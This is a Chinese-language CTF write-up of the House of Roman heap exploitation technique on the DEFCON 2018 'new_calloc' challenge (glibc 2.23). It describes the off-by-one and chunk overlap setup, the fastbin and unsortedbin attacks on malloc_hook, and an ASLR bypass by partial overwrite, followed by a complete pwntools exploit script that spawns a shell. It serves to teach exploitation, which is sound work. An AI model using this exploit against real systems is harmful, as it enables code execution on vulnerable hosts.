#### house of roman

在无法泄露地址的情况下，通过unsortedbin攻击将malloc_hook部分覆写为one_gadget的地址来bypass ASLR

#### DEFCON2018 house of roman

程序名为new_calloc，题目中的堆块分配也使用了calloc进行分配

add，edit，free，无show函数，有off by one，对指针进行清空，无UAF

libc版本2.23

##### 思路

首先打malloc_hook需要在其附近分配堆块，需要劫持fastbin的fd指针

1. 将fastbin的fd改为unsorted+0x68
2. 通过部分写来改为malloc_hook-0x23

利用unsortedbin的残留指针需要对chunk做切割，所以被劫持的fastbin中的chunk的上边必须还有一个被分配的指针用来free（达到切割的目的）

覆写时需要将该chunk置于fastbin中，而又需要修改这个chunk（chunk被分配），所以需要chunk overlap使得通过对前一个堆块编辑修改掉此chunk

```
add(0x80)   # 0		被合并的chunk，再次申请后，对其后地址任意写
add(0x10)   # 1		用来对unsortedbin中的chunk做切割
add(0x18)   # 2		fastbin中的chunk，fd将被覆写并劫持，同时用来修改后一个chunk的presize和size
add(0x10)   # 3		被释放的chunk，先前合并
add(0x100)  # 4		top barrier
```

然后通过编辑被合并的堆块来劫持fd指针，实现分配到malloc_hook的chunk，

但是这里会出现一个问题，分配使用calloc，即第一次分配到的用来做劫持的fastbin的chunk的fd和bk指针被破环，unsortedbin结构被破环，但我们还需要一次unsortebin attack来改写malloc_hook

矛盾在于，之要劫持过一次fastbin或进行一次unsortebin attack，unsorted bin指针就会被破环，

这里有一个思路是，构造unsortedbin，使用unsortedbin的第一个chunk来劫持fastbin，使用最后一个chunk进行unsortedbin attack，但是最后一个chunk的bk指向了堆地址，无法指向libc部分

看了作者的思路，[DEF CON 26 Hacking Conference](https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/Sanat%20Sharma/DEFCON-26-Sanat-Sharma-House-of-Roman-Updated.pdf)

当mmap标志位为1时，calloc不会将chunk内容覆写

最后在触发malloc_hook时，会发现任何一个one_gadget都打不通，这里借鉴了[House of Roman](https://blog.csdn.net/yjh_fnu_ltn/article/details/141331866?spm=1001.2014.3001.5506)，通过double free触发malloc_printerr，malloc_printerr最后会调用到malloc，从而触发malloc_hook，而此时的环境是能够满足一gadget

##### exp

```
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

# io = gdb.debug('/home/kali/pwn/new_calloc')

libc = ELF('/home/kali/pwn/libc/x64/libc-2.23.so')
one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]


def exp(i):
    def add(size):
        io.sendafter(b'3. Free\n', b'1')
        io.sendafter(b'Enter size of chunk :', str(size).encode(encoding='utf-8'))

    def edit(index, payload):
        io.sendafter(b'3. Free\n', b'2')
        io.sendafter(b'Enter index of chunk :', str(index).encode(encoding='utf-8'))
        io.sendafter(b'Enter data :', payload)

    def free(index):
        io.sendafter(b'3. Free\n', b'3')
        io.sendafter(b'Enter index of chunk :', str(index).encode(encoding='utf-8'))

    io = process('/home/kali/pwn/new_calloc')
    add(0x80)  # 0
    add(0x10)  # 1
    add(0x18)  # 2
    add(0x10)  # 3
    add(0x100)  # 4

    free(0)
    edit(2, b'a' * 0x10 + p64(0xd0) + b'\x90')

    edit(4, b'a' * 0x60 + p64(0) + p64(0xa1))
    free(3)

    add(0x150)  # 0
    edit(0, b'\x00' * 0x88 + p64(0x91) + b'\x00' * 0x18 + p64(0x71) + b'\x00' * 0x60 + p64(0) + p64(0x41))

    free(1)
    free(2)
    add(0x10)  # 1

    edit(0, b'\x00' * 0x88 + p64(0x21) + b'\x00' * 0x18 + p64(0x73) + b'\xed\x4a')

    add(0x68)  # 2
    add(0x68)  # 3

    edit(0, b'\x00' * 0x88 + p64(0x21) + b'\x00' * 0x18 + p64(0xc1) + p64(0) + b'\x00\x4b')
    add(0xb0)

    backdoor = one_gadget[3]

    edit(3, b'\x00' * 0x13 + p64(backdoor)[:2:] + (p64(backdoor)[2] + 0xa0).to_bytes(1, byteorder='big'))

    edit(0, b'\x00' * 0x88 + p64(0x41))
    free(1)

    io.interactive()

for i in range(0, 0x100, 0x10):
    exp(i)
    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
```
